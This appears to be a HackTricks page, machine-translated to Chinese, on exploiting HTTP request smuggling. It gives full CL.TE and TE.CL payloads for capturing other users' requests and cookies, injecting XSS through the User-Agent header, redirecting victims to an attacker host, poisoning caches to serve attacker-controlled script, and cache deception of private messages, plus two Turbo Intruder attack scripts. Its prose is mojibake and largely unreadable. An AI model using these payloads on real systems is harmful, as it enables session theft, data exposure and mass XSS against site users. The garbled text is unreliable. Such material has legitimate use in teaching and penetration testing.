è¦è°ƒæŸ¥ä»£ç†å¦‚ä½•ä¿®æ”¹è¯·æ±‚ï¼Œè¯·æŸ¥æ‰¾åç«¯åœ¨å“åº”ä¸­å›æ˜¾çš„POSTå‚æ•°ã€‚ç„¶åï¼Œåˆ¶ä½œä¸€ä¸ªè¯·æ±‚ï¼Œå°†æ­¤å‚æ•°æ”¾åœ¨æœ€åï¼Œç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
åœ¨è¿™ç§ç»“æ„ä¸­ï¼Œåç»­è¯·æ±‚ç»„ä»¶è¢«é™„åŠ åœ¨`search=`ä¹‹åï¼Œè¯¥å‚æ•°åœ¨å“åº”ä¸­åæ˜ å‡ºæ¥ã€‚è¿™ç§åå°„å°†æš´éœ²å‡ºåç»­è¯·æ±‚çš„æ ‡å¤´ã€‚

é‡è¦çš„æ˜¯è¦å°†åµŒå¥—è¯·æ±‚çš„`Content-Length`æ ‡å¤´ä¸å®é™…å†…å®¹é•¿åº¦å¯¹é½ã€‚ä»ä¸€ä¸ªå°å€¼å¼€å§‹é€æ¸å¢åŠ æ˜¯æ˜æ™ºçš„ï¼Œå› ä¸ºå€¼è¿‡ä½å°†æˆªæ–­åæ˜ çš„æ•°æ®ï¼Œè€Œå€¼è¿‡é«˜å¯èƒ½ä¼šå¯¼è‡´è¯·æ±‚å‡ºé”™ã€‚

è¿™ç§æŠ€æœ¯åœ¨TE.CLæ¼æ´çš„æƒ…å†µä¸‹ä¹Ÿé€‚ç”¨ï¼Œä½†è¯·æ±‚åº”ä»¥`search=\r\n0`ç»“æŸã€‚æ— è®ºæ¢è¡Œç¬¦æ˜¯ä»€ä¹ˆï¼Œè¿™äº›å€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸Šã€‚

è¿™ç§æ–¹æ³•ä¸»è¦ç”¨äºç†è§£å‰ç«¯ä»£ç†æ‰€åšçš„è¯·æ±‚ä¿®æ”¹ï¼Œå®è´¨ä¸Šæ˜¯è¿›è¡Œè‡ªæˆ‘å¯¼å‘çš„è°ƒæŸ¥ã€‚

### æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

é€šè¿‡åœ¨POSTæ“ä½œæœŸé—´å°†ç‰¹å®šè¯·æ±‚é™„åŠ ä¸ºå‚æ•°çš„å€¼ï¼Œå¯ä»¥æ•è·ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•å®ç°è¿™ä¸€ç‚¹çš„æ–¹æ³•ï¼š
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**commentå‚æ•°**æ—¨åœ¨å­˜å‚¨å…¬å¼€é¡µé¢ä¸Šå¸–å­è¯„è®ºéƒ¨åˆ†çš„å†…å®¹ã€‚å› æ­¤ï¼Œéšåè¯·æ±‚çš„å†…å®¹å°†æ˜¾ç¤ºä¸ºè¯„è®ºã€‚

ç„¶è€Œï¼Œè¿™ç§æŠ€æœ¯æœ‰å±€é™æ€§ã€‚é€šå¸¸ï¼Œå®ƒä»…æ•è·ç›´åˆ°è¢«ç”¨äºä¼ªé€ è¯·æ±‚çš„å‚æ•°åˆ†éš”ç¬¦ä¸ºæ­¢çš„æ•°æ®ã€‚å¯¹äºURLç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™ä¸ªåˆ†éš”ç¬¦æ˜¯`&`å­—ç¬¦ã€‚è¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·è¯·æ±‚ä¸­æ•è·çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª`&`å¤„åœæ­¢ï¼Œç”šè‡³å¯èƒ½æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚

æ­¤å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•åœ¨å­˜åœ¨TE.CLæ¼æ´æ—¶ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ±‚åº”ä»¥`search=\r\n0`ç»“å°¾ã€‚æ— è®ºæ¢è¡Œç¬¦æ˜¯ä»€ä¹ˆï¼Œå€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸Šã€‚

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹XSS

HTTPè¯·æ±‚èµ°ç§å¯ç”¨äºåˆ©ç”¨æ˜“å—**åå°„å‹XSS**æ”»å‡»çš„ç½‘é¡µï¼Œæä¾›äº†æ˜¾è‘—ä¼˜åŠ¿ï¼š

* **æ— éœ€ä¸ç›®æ ‡ç”¨æˆ·äº¤äº’**ã€‚
* å…è®¸åˆ©ç”¨é€šå¸¸**æ— æ³•è·å–**çš„è¯·æ±‚éƒ¨åˆ†ä¸­çš„XSSï¼Œå¦‚HTTPè¯·æ±‚å¤´ã€‚

åœ¨ç½‘ç«™å®¹æ˜“å—åˆ°é€šè¿‡ç”¨æˆ·ä»£ç†æ ‡å¤´åå°„å‹XSSæ”»å‡»çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸‹æœ‰æ•ˆè½½è·æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼š
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
è¿™ä¸ª payload çš„ç»“æ„ç”¨äºåˆ©ç”¨æ¼æ´ï¼š

1. å‘èµ·ä¸€ä¸ª `POST` è¯·æ±‚ï¼Œçœ‹ä¼¼å…¸å‹ï¼Œå¸¦æœ‰ `Transfer-Encoding: chunked` å¤´éƒ¨æ¥æŒ‡ç¤ºå¼€å§‹è¿›è¡Œèµ°ç§ã€‚
2. æ¥ç€æ˜¯ä¸€ä¸ª `0`ï¼Œæ ‡è®°äº†åˆ†å—æ¶ˆæ¯ä½“çš„ç»“æŸã€‚
3. ç„¶åå¼•å…¥ä¸€ä¸ªèµ°ç§çš„ `GET` è¯·æ±‚ï¼Œå…¶ä¸­ `User-Agent` å¤´éƒ¨è¢«æ³¨å…¥äº†ä¸€ä¸ªè„šæœ¬ `<script>alert(1)</script>`ï¼Œå½“æœåŠ¡å™¨å¤„ç†è¿™ä¸ªåç»­è¯·æ±‚æ—¶è§¦å‘ XSSã€‚

é€šè¿‡èµ°ç§æ‰‹æ®µæ“çºµ `User-Agent`ï¼Œpayload èƒ½å¤Ÿç»•è¿‡æ­£å¸¸è¯·æ±‚çš„é™åˆ¶ï¼Œä»è€Œä»¥éæ ‡å‡†ä½†æœ‰æ•ˆçš„æ–¹å¼åˆ©ç”¨åå°„å‹ XSS æ¼æ´ã€‚

### åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§å°†ç«™å†…é‡å®šå‘å˜æˆå¼€æ”¾é‡å®šå‘ <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§åˆ©ç”¨ç«™å†…é‡å®šå‘ <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

åº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡åœ¨é‡å®šå‘ URL ä¸­ä½¿ç”¨ `Host` å¤´éƒ¨ä¸­çš„ä¸»æœºåæ¥ä»ä¸€ä¸ª URL é‡å®šå‘åˆ°å¦ä¸€ä¸ªã€‚è¿™åœ¨åƒ Apache å’Œ IIS è¿™æ ·çš„ Web æœåŠ¡å™¨ä¸­å¾ˆå¸¸è§ã€‚ä¾‹å¦‚ï¼Œè¯·æ±‚ä¸€ä¸ªæ²¡æœ‰å°¾éšæ–œæ çš„æ–‡ä»¶å¤¹ä¼šå¯¼è‡´é‡å®šå‘ä»¥åŒ…å«æ–œæ ï¼š
```
GET /home HTTP/1.1
Host: normal-website.com
```
ç»“æœå¦‚ä¸‹ï¼š
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
è™½ç„¶çœ‹ä¼¼æ— å®³ï¼Œä½†è¿™ç§è¡Œä¸ºå¯ä»¥é€šè¿‡HTTPè¯·æ±‚èµ°ç§æ¥æ“çºµï¼Œå°†ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨ç½‘ç«™ã€‚ä¾‹å¦‚ï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
è¿™ç§èµ°ç§è¯·æ±‚å¯èƒ½å¯¼è‡´ä¸‹ä¸€ä¸ªå¤„ç†çš„ç”¨æˆ·è¯·æ±‚è¢«é‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼š
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
ç»“æœä¸ºï¼š
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§æ‰§è¡ŒWebç¼“å­˜æŠ•æ¯’ <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§è¿›è¡ŒWebç¼“å­˜æŠ•æ¯’ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

å¦‚æœ**å‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•ç»„ä»¶ç¼“å­˜å†…å®¹**ï¼Œé€šå¸¸æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡ŒWebç¼“å­˜æŠ•æ¯’ã€‚é€šè¿‡æ“çºµæœåŠ¡å™¨çš„å“åº”ï¼Œå¯ä»¥**æŠ•æ¯’ç¼“å­˜**ã€‚

ä¹‹å‰ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°æœåŠ¡å™¨å“åº”å¯ä»¥è¢«ä¿®æ”¹ä»¥è¿”å›404é”™è¯¯ï¼ˆå‚è€ƒ[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ï¼‰ã€‚åŒæ ·ï¼Œå¯ä»¥æ¬ºéª—æœåŠ¡å™¨ï¼Œä½¿å…¶åœ¨å“åº”å¯¹`/static/include.js`çš„è¯·æ±‚æ—¶æä¾›`/index.html`å†…å®¹ã€‚å› æ­¤ï¼Œ`/static/include.js`çš„å†…å®¹è¢«`/index.html`æ›¿æ¢åœ¨ç¼“å­˜ä¸­ï¼Œä½¿å¾—ç”¨æˆ·æ— æ³•è®¿é—®`/static/include.js`ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚

å¦‚æœå‘ç°**å¼€æ”¾é‡å®šå‘æ¼æ´**æˆ–å­˜åœ¨**ç«™ç‚¹é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**ï¼Œåˆ™æ­¤æŠ€æœ¯å˜å¾—ç‰¹åˆ«å¼ºå¤§ã€‚å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´å°†`/static/include.js`çš„ç¼“å­˜å†…å®¹æ›¿æ¢ä¸ºå—æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬ï¼Œä»è€Œåœ¨æ‰€æœ‰è¯·æ±‚æ›´æ–°çš„`/static/include.js`çš„å®¢æˆ·ç«¯ä¸­å®æ–½å¹¿æ³›çš„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»ã€‚

ä»¥ä¸‹æ˜¯åˆ©ç”¨**ç¼“å­˜æŠ•æ¯’ç»“åˆç«™ç‚¹é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**çš„ç¤ºä¾‹ã€‚ç›®æ ‡æ˜¯ä¿®æ”¹`/static/include.js`çš„ç¼“å­˜å†…å®¹ï¼Œä»¥æä¾›å—æ”»å‡»è€…æ§åˆ¶çš„JavaScriptä»£ç ï¼š
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
æ³¨æ„åµŒå…¥çš„è¯·æ±‚é’ˆå¯¹ `/post/next?postId=3`ã€‚è¯¥è¯·æ±‚å°†è¢«é‡å®šå‘åˆ° `/post?postId=4`ï¼Œåˆ©ç”¨**Host å¤´å€¼**æ¥ç¡®å®šåŸŸã€‚é€šè¿‡ä¿®æ”¹**Host å¤´**ï¼Œæ”»å‡»è€…å¯ä»¥å°†è¯·æ±‚é‡å®šå‘åˆ°ä»–ä»¬çš„åŸŸ (**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**)ã€‚

æˆåŠŸè¿›è¡Œ**socket æ¯’åŒ–**åï¼Œåº”å‘èµ·å¯¹ `/static/include.js` çš„**GET è¯·æ±‚**ã€‚è¯¥è¯·æ±‚å°†å—åˆ°ä¹‹å‰çš„**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**è¯·æ±‚çš„æ±¡æŸ“ï¼Œå¹¶è·å–æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬å†…å®¹ã€‚

éšåï¼Œä»»ä½•å¯¹ `/static/include.js` çš„è¯·æ±‚éƒ½å°†æä¾›æ”»å‡»è€…è„šæœ¬çš„ç¼“å­˜å†…å®¹ï¼Œæœ‰æ•ˆåœ°å‘èµ·å¹¿æ³›çš„ XSS æ”»å‡»ã€‚


### ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ‰§è¡Œ Web ç¼“å­˜æ¬ºéª— <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web ç¼“å­˜æ¯’åŒ–å’Œ Web ç¼“å­˜æ¬ºéª—æœ‰ä½•åŒºåˆ«ï¼Ÿ**
>
> * åœ¨**Web ç¼“å­˜æ¯’åŒ–**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºå°†ä¸€äº›æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¹¶ä»ç¼“å­˜ä¸­å‘å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·æä¾›æ­¤å†…å®¹ã€‚
> * åœ¨**Web ç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºå°†å±äºå¦ä¸€ç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢æ­¤å†…å®¹ã€‚

æ”»å‡»è€…æ„é€ äº†ä¸€ä¸ªèµ°ç§è¯·æ±‚ï¼Œç”¨äºè·å–æ•æ„Ÿçš„ç”¨æˆ·ç‰¹å®šå†…å®¹ã€‚è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
å¦‚æœè¿™ä¸ªèµ°ç§çš„è¯·æ±‚æ¯’å®³äº†ä¸€ä¸ªç”¨äºé™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ï¼ˆä¾‹å¦‚ï¼Œ`/someimage.png`ï¼‰ï¼Œå—å®³è€…çš„æ•æ„Ÿæ•°æ®å¯èƒ½ä¼šè¢«ç¼“å­˜åœ¨é™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ä¸‹ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ½œåœ¨åœ°æ£€ç´¢è¿™äº›ç¼“å­˜çš„æ•æ„Ÿæ•°æ®ã€‚

### åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§ä¸ HTTP å“åº”è§£åŒæ­¥

æ‚¨æ˜¯å¦å‘ç°äº†ä¸€äº› HTTP è¯·æ±‚èµ°ç§æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒã€‚å°è¯•è¿™äº›å…¶ä»–åˆ©ç”¨æ–¹æ³•ï¼š

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder è„šæœ¬

### CL.TE

æ¥æºï¼š[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## å·¥å…·

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): è¿™ä¸ªå·¥å…·æ˜¯åŸºäºè¯­æ³•çš„HTTP Fuzzerï¼Œç”¨äºå‘ç°å¥‡æ€ªçš„è¯·æ±‚æ¬ºéª—å·®å¼‚ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ä¸Šå…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚ 

</details>
